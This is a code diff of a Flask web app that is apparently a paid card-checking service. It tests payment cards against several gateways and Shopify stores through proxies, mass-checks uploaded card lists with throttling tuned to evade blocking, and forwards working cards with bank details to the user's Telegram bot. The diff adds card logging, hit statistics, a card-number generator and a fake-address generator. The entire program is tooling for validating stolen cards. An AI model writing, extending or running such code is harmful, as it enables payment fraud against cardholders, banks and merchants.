@@ -17,6 +17,7 @@ import sqlite3
 import telebot
 from telebot import types
 import os
+import re
 
 app = Flask(__name__)
 app.secret_key = 'storm_x_secret_key_2025'
@@ -36,6 +37,8 @@ def init_db():
         credits INTEGER DEFAULT 100,
         bot_token TEXT,
         chat_id TEXT,
+        approved_count INTEGER DEFAULT 0,
+        declined_count INTEGER DEFAULT 0,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS access_logs (
@@ -44,6 +47,16 @@ def init_db():
         access_key TEXT,
         ip_address TEXT,
         accessed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS card_logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        card_data TEXT,
+        status TEXT,
+        gateway TEXT,
+        response TEXT,
+        amount TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )''')
     conn.commit()
     conn.close()
@@ -124,6 +137,7 @@ def get_session_id():
 
 def get_user_by_access_key(access_key):
     conn = sqlite3.connect('users.db')
+    conn.row_factory = sqlite3.Row
     c = conn.cursor()
     c.execute('SELECT * FROM users WHERE access_key = ?', (access_key,))
     user = c.fetchone()
@@ -134,6 +148,24 @@ def update_user_credits(user_id, credit_change):
     conn = sqlite3.connect('users.db')
     c = conn.cursor()
     c.execute('UPDATE users SET credits = credits + ? WHERE id = ?', (credit_change, user_id))
+    conn.commit()
+    conn.close()
+
+def update_user_stats(user_id, status):
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    if status.lower() == 'approved':
+        c.execute('UPDATE users SET approved_count = approved_count + 1 WHERE id = ?', (user_id,))
+    else:
+        c.execute('UPDATE users SET declined_count = declined_count + 1 WHERE id = ?', (user_id,))
+    conn.commit()
+    conn.close()
+
+def log_card(user_id, card_data, status, gateway, response, amount=None):
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    c.execute('INSERT INTO card_logs (user_id, card_data, status, gateway, response, amount) VALUES (?, ?, ?, ?, ?, ?)',
+              (user_id, card_data, status, gateway, response, amount))
     conn.commit()
     conn.close()
 
@@ -154,16 +186,19 @@ def send_card_to_user_bot(user_id, result_entry):
     conn.close()
 
     if not row or not row["bot_token"] or not row["chat_id"]:
-        return  # user hasn’t set bot yet
+        return  # user hasn't set bot yet
 
     bot_token = row["bot_token"]
     chat_id = row["chat_id"]
 
+    amount_text = f"💰 Amount: ${result_entry.get('amount', 'N/A')}\n" if result_entry.get('amount') else ""
+    
     msg = (
         f"✅ *Approved Card Found!*\n\n"
         f"💳 Card: `{result_entry['card']}`\n"
         f"📡 Gateway: {result_entry['gateway']}\n"
         f"📝 Response: {result_entry['response']}\n"
+        f"{amount_text}"
         f"🏦 Bank: {result_entry['bin'].get('bank', '-')}\n"
         f"🌍 Country: {result_entry['bin'].get('country', '-')}\n"
         f"⏰ Time: {result_entry['timestamp']}"
@@ -178,7 +213,6 @@ def send_card_to_user_bot(user_id, result_entry):
         )
     except Exception as e:
         print(f"Failed to send message to user {user_id}: {e}")
-
 
 # -----------------------
 # Middleware to Check Access
@@ -200,7 +234,7 @@ def check_access():
         return redirect(url_for('login'))
     
     # Check if user has credits
-    if user[6] <= 0 and request.endpoint not in ['profile', 'logout']:
+    if user['credits'] <= 0 and request.endpoint not in ['profile', 'logout', 'index']:
         return redirect(url_for('profile'))
 
 @app.route('/login')
@@ -221,12 +255,12 @@ def verify_access():
     
     if user:
         session['access_key'] = access_key
-        session['user_id'] = user[0]
-        session['username'] = user[2] or user[3] or f"User_{user[0]}"
-        session['credits'] = user[6]
+        session['user_id'] = user['id']
+        session['username'] = user['username'] or user['first_name'] or f"User_{user['id']}"
+        session['credits'] = user['credits']
         
         # Log the access
-        log_access(user[0], access_key, request.remote_addr)
+        log_access(user['id'], access_key, request.remote_addr)
         
         return jsonify({'success': True, 'message': 'Access granted!', 'redirect': url_for('index')})
     else:
@@ -242,7 +276,27 @@ def logout():
 # -----------------------
 @app.route('/')
 def index():
-    return render_template('index.html', username=session.get('username'), credits=session.get('credits', 0))
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    # Get user stats
+    conn = sqlite3.connect('users.db')
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute('SELECT approved_count, declined_count FROM users WHERE id = ?', (session['user_id'],))
+    user_stats = c.fetchone()
+    conn.close()
+    
+    approved = user_stats['approved_count'] if user_stats else 0
+    declined = user_stats['declined_count'] if user_stats else 0
+    total = approved + declined
+    
+    return render_template('index.html', 
+                          username=session.get('username'), 
+                          credits=session.get('credits', 0),
+                          approved_count=approved,
+                          declined_count=declined,
+                          total_checks=total)
 
 @app.route('/single')
 def single_check():
@@ -258,12 +312,10 @@ def results_page():
 
 @app.route('/bin_info', methods=['GET'])
 def bin_info_page():
-    # This handles GET requests and renders the BIN info page
     return render_template('bin_info.html', username=session.get('username'), credits=session.get('credits', 0))
 
 @app.route('/bin_lookup', methods=['POST'])
 def bin_lookup():
-    # This handles the actual BIN lookup via POST
     bin_number = request.form.get('bin', '').strip()
     if not bin_number:
         return jsonify({'success': False, 'error': 'BIN is required'})
@@ -283,7 +335,7 @@ def profile():
         return redirect(url_for('login'))
     
     conn = sqlite3.connect('users.db')
-    conn.row_factory = sqlite3.Row  # lets us access columns by name
+    conn.row_factory = sqlite3.Row
     c = conn.cursor()
 
     c.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],))
@@ -292,6 +344,11 @@ def profile():
     # Get access logs
     c.execute('SELECT * FROM access_logs WHERE user_id = ? ORDER BY accessed_at DESC LIMIT 5', (session['user_id'],))
     access_logs = c.fetchall()
+    
+    # Get recent card checks
+    c.execute('SELECT * FROM card_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT 10', (session['user_id'],))
+    card_logs = c.fetchall()
+    
     conn.close()
     
     return render_template(
@@ -299,22 +356,20 @@ def profile():
         username=session.get('username'),
         credits=session.get('credits', 0),
         user=user,
-        access_logs=access_logs
+        access_logs=access_logs,
+        card_logs=card_logs
     )
-
 
 @app.route('/check_card', methods=['POST'])
 def check_card_route():
-    # --- Authentication check ---
     if 'user_id' not in session or 'access_key' not in session:
         return jsonify({'error': 'Authentication required'}), 401
 
-    # Verify user exists and has credits
     user = get_user_by_access_key(session['access_key'])
     if not user:
         session.clear()
         return jsonify({'error': 'Invalid session'}), 401
-    if user[6] <= 0:
+    if user['credits'] <= 0:
         return jsonify({'error': 'Insufficient credits!'}), 403
 
     session_id = get_session_id()
@@ -324,7 +379,7 @@ def check_card_route():
     if not card_data:
         return jsonify({'error': 'No card data provided'}), 400
 
-    # --- Process the card ---
+    # Process the card
     if gateway == 'au':
         result = process_card_au(card_data)
     elif gateway == 'chk':
@@ -333,18 +388,25 @@ def check_card_route():
         result = check_vbv_card(card_data)
     elif gateway == 'b3':
         result = process_card_b3(card_data)
-    elif gateway == "svb" :
+    elif gateway == "svb":
         result = process_card_svb(card_data)
     elif gateway == "pp":
         result = process_card_pp(card_data)
     else:
         return jsonify({'error': 'Invalid gateway selected'}), 400
 
-    # --- Deduct credits ---
+    # Deduct credits
     update_user_credits(session['user_id'], -1)
-    session['credits'] = max(0, session.get('credits', 0) - 1)
+    session['credits'] = max(0, user['credits'] - 1)
+    
+    # Update user stats
+    update_user_stats(session['user_id'], result.get('status', 'Error'))
+    
+    # Log the card check
+    log_card(session['user_id'], card_data, result.get('status', 'Error'), 
+             result.get('gateway', gateway.upper()), result.get('response', 'Unknown error'))
 
-    # --- BIN info lookup ---
+    # BIN info lookup
     bin_number = card_data[:6]
     bin_info = {}
     try:
@@ -354,7 +416,7 @@ def check_card_route():
     except Exception as e:
         bin_info = {"error": str(e)}
 
-    # --- Store result ---
+    # Store result
     result_id = str(uuid.uuid4())
     timestamp = datetime.now().strftime("%H:%M:%S")
 
@@ -375,7 +437,7 @@ def check_card_route():
         if len(results[session_id]) > 50:
             results[session_id] = results[session_id][:50]
 
-    # --- Bot notification ---
+    # Bot notification for approved cards
     if result_entry['status'].lower() == 'approved':
         send_card_to_user_bot(session['user_id'], result_entry)
 
@@ -385,7 +447,6 @@ def check_card_route():
     })
 
 import concurrent.futures
-import random
 
 def safe_process_card(gateway_func, card_data, timeout=12):
     """Run one card check safely in a thread with timeout and better error handling."""
@@ -394,7 +455,6 @@ def safe_process_card(gateway_func, card_data, timeout=12):
             future = executor.submit(gateway_func, card_data)
             result = future.result(timeout=timeout)
             
-            # Ensure the result has the expected structure
             if not isinstance(result, dict):
                 return {
                     "status": "Error",
@@ -402,7 +462,6 @@ def safe_process_card(gateway_func, card_data, timeout=12):
                     "gateway": gateway_func.__name__,
                 }
             
-            # Check if the response indicates a blocking or timeout
             response_text = str(result.get("response", "")).lower()
             if any(blocked_indicator in response_text for blocked_indicator in 
                   ["timeout", "block", "fail", "error", "invalid", "refused", "denied"]):
@@ -427,7 +486,6 @@ def safe_process_card(gateway_func, card_data, timeout=12):
             "gateway": gateway_func.__name__,
         }
 
-
 @app.route("/mass_check", methods=["GET"])
 def mass_check():
     if "user_id" not in session or "access_key" not in session:
@@ -442,21 +500,21 @@ def mass_check():
             yield f"data: {json.dumps({'error': 'Invalid session'})}\n\n"
         return Response(stream_with_context(error_generate()), mimetype="text/event-stream")
 
-    # --- Prepare cards ---
+    # Prepare cards
     raw_card_list = request.args.get("card_list", "")
     card_list = [c.strip() for c in raw_card_list.split("\n") if c.strip()]
     card_count = len(card_list)
     gateway = request.args.get("gateway", "au")
 
-    # --- Check credits upfront ---
-    if user[6] < card_count:
+    # Check credits upfront
+    if user['credits'] < card_count:
         def error_generate():
-            yield f"data: {json.dumps({'error': f'Insufficient credits. You have {user[6]} but need {card_count}'})}\n\n"
+            yield f"data: {json.dumps({'error': f'Insufficient credits. You have {user["credits"]} but need {card_count}'})}\n\n"
         return Response(stream_with_context(error_generate()), mimetype="text/event-stream")
 
     # Deduct credits for all cards upfront
     update_user_credits(session["user_id"], -card_count)
-    session["credits"] = max(0, user[6] - card_count)
+    session["credits"] = max(0, user['credits'] - card_count)
 
     def generate():
         processed_count = 0
@@ -494,13 +552,27 @@ def mass_check():
                     "gateway": result.get("gateway", gateway.upper()),
                 }
 
+                # Update user stats and log the card
+                update_user_stats(session["user_id"], res_data["status"])
+                log_card(session["user_id"], card_data, res_data["status"], 
+                         res_data["gateway"], res_data["response"])
+
                 # Count successful checks (non-error responses)
                 if result.get("status") != "Error":
                     successful_checks += 1
 
-                # --- Send approved to user bot ---
+                # Send approved to user bot
                 if res_data["status"].lower() == "approved":
                     try:
+                        bin_number = card_data[:6]
+                        bin_info = {}
+                        try:
+                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
+                            if r.status_code == 200:
+                                bin_info = r.json()
+                        except:
+                            pass
+                            
                         send_card_to_user_bot(
                             session["user_id"],
                             {
@@ -508,7 +580,7 @@ def mass_check():
                                 "status": res_data["status"],
                                 "response": res_data["response"],
                                 "gateway": res_data["gateway"],
-                                "bin": {},
+                                "bin": bin_info,
                                 "timestamp": datetime.now().strftime("%H:%M:%S"),
                             },
                         )
@@ -520,10 +592,8 @@ def mass_check():
 
                 # Dynamic delay based on success rate
                 if successful_checks / max(1, processed_count) > 0.7:
-                    # If success rate is high, use shorter delay
                     time.sleep(0.3)
                 else:
-                    # If many failures, use longer delay to avoid blocking
                     time.sleep(1.0)
 
             except Exception as e:
@@ -560,9 +630,7 @@ def save_bot():
     conn.commit()
     conn.close()
 
-    # flash message optional
     return redirect(url_for('profile'))
-
 
 @app.route('/get_results')
 def get_results():
@@ -570,7 +638,6 @@ def get_results():
     with result_lock:
         session_results = results.get(session_id, [])
     return jsonify({'results': session_results})
-
 
 @app.route('/clear_results')
 def clear_results():
@@ -586,21 +653,23 @@ def shopify_check():
         return redirect(url_for('login'))
     return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))
 
-@app.route('/shopify_check', methods=['GET', 'POST'])
+@app.route('/shopify_check', methods=['POST'])
 def shopify_check_process():
     if 'user_id' not in session or 'access_key' not in session:
         return jsonify({'error': 'Authentication required'}), 401
     
-    # Handle both GET (from EventSource) and POST (from form) requests
-    if request.method == 'POST':
-        # Get form data
-        sites = request.form.get('sites', '').strip().split('\n')
-        proxies = request.form.get('proxies', '').strip().split('\n')
-        cards = request.form.get('cards', '').strip().split('\n')
-    else:  # GET request from EventSource
-        sites = request.args.get('sites', '').strip().split('\n')
-        proxies = request.args.get('proxies', '').strip().split('\n')
-        cards = request.args.get('cards', '').strip().split('\n')
+    # Get form data
+    sites = request.form.get('sites', '').strip().split('\n')
+    proxies = request.form.get('proxies', '').strip().split('\n')
+    cards = request.form.get('cards', '').strip().split('\n')
+    
+    # Handle file upload
+    if 'card_file' in request.files:
+        file = request.files['card_file']
+        if file and file.filename.endswith('.txt'):
+            file_content = file.read().decode('utf-8')
+            cards_from_file = [c.strip() for c in file_content.split('\n') if c.strip()]
+            cards.extend(cards_from_file)
     
     # Clean up empty lines
     sites = [site.strip() for site in sites if site.strip()]
@@ -609,6 +678,15 @@ def shopify_check_process():
     
     if not sites or not cards:
         return jsonify({'error': 'Sites and cards are required'}), 400
+    
+    # Check credits
+    user = get_user_by_access_key(session['access_key'])
+    if user['credits'] < len(cards):
+        return jsonify({'error': f'Insufficient credits. You have {user["credits"]} but need {len(cards)}'}), 403
+    
+    # Deduct credits
+    update_user_credits(session['user_id'], -len(cards))
+    session['credits'] = max(0, user['credits'] - len(cards))
     
     # Prepare for streaming response
     def generate():
@@ -649,10 +727,10 @@ def shopify_check_process():
                 response_upper = data.get('Response', '').upper()
                 price = data.get('Price', 'N/A')
                 gateway = data.get('Gateway', 'N/A')
+                
                 if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
                     bot_response = data.get('Response', 'Unknown')
                     status = 'HIT'
-                
                 elif '3D' in response_upper or 'OTP' in response_upper:
                     bot_response = data.get('Response', 'Unknown')
                     status = 'APPROVED'
@@ -666,17 +744,30 @@ def shopify_check_process():
                     bot_response = data.get('Response', 'Unknown')
                     status = 'DECLINED'
                 
+                # Update user stats and log the card
+                update_user_stats(session['user_id'], status)
+                log_card(session['user_id'], card, status, 'SHOPIFY', bot_response, price)
+                
                 # Send approved cards to user's bot
-                if status in ['APPROVED', 'APPROVED_OTP']:
+                if status in ['APPROVED', 'HIT']:
                     try:
+                        bin_number = card[:6]
+                        bin_info = {}
+                        try:
+                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
+                            if r.status_code == 200:
+                                bin_info = r.json()
+                        except:
+                            pass
+                            
                         send_card_to_user_bot(
                             session['user_id'],
                             {
                                 'card': card,
                                 'status': status,
                                 'response': bot_response,
-                                'gateway': 'SHOPIFY',
-                                'bin': {},
+                                'gateway': gateway,
+                                'bin': bin_info,
                                 'timestamp': datetime.now().strftime("%H:%M:%S"),
                                 'amount': price
                             }
@@ -720,10 +811,9 @@ def shopify_check_process():
 @app.route('/gen', methods=['GET', 'POST'])
 def gen_card():
     if request.method == 'GET':
-        # Render the form page
         return render_template('gen.html', username=session.get('username'), credits=session.get('credits', 0))
     
-    # Handle POST request (form submission)
+    # Handle POST request
     bin_number = request.form.get('bin', '').strip()
     count = request.form.get('quantity', '10').strip()
 
@@ -734,7 +824,6 @@ def gen_card():
         api_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count={count}"
         res = requests.get(api_url)
         
-        # Check if response is HTML (error page)
         if 'text/html' in res.headers.get('Content-Type', ''):
             return jsonify({'success': False, 'error': 'Card generation service is temporarily unavailable'})
         
@@ -742,10 +831,7 @@ def gen_card():
             data = res.json()
             cards = data.get("cards", [])
         except json.JSONDecodeError:
-            # If it's not JSON, try to extract cards from text response
             content = res.text
-            # Try to find card patterns in the response
-            import re
             card_pattern = r'\b\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}\b'
             cards = re.findall(card_pattern, content)
             
@@ -769,6 +855,51 @@ def gen_card():
 
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/fake_address')
+def fake_address():
+    if 'user_id' not in session or 'access_key' not in session:
+        return redirect(url_for('login'))
+    return render_template('fake_address.html', username=session.get('username'), credits=session.get('credits', 0))
+
+@app.route('/generate_address', methods=['POST'])
+def generate_address():
+    try:
+        country = request.form.get('country', 'us')
+        count = int(request.form.get('count', 1))
+        
+        addresses = []
+        for _ in range(count):
+            response = requests.get(f'https://randomuser.me/api/?nat={country}')
+            data = response.json()
+            user = data['results'][0]
+            
+            address = {
+                'name': f"{user['name']['first']} {user['name']['last']}",
+                'street': f"{user['location']['street']['number']} {user['location']['street']['name']}",
+                'city': user['location']['city'],
+                'state': user['location']['state'],
+                'zip': user['location']['postcode'],
+                'country': user['nat'],
+                'phone': user['phone'],
+                'email': user['email']
+            }
+            addresses.append(address)
+        
+        if count > 5:
+            content = "\n\n".join([f"{k}: {v}" for addr in addresses for k, v in addr.items()])
+            return send_file(
+                io.BytesIO(content.encode("utf-8")),
+                as_attachment=True,
+                download_name=f"fake_addresses_{country}.txt",
+                mimetype="text/plain"
+            )
+            
+        return jsonify({'success': True, 'addresses': addresses})
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
 # -----------------------
 # BIN INFO
 # -----------------------
@@ -786,7 +917,6 @@ def bin_info():
         return jsonify({'success': True, 'data': res.json()})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
-
 
 # -----------------------
 # MAIN
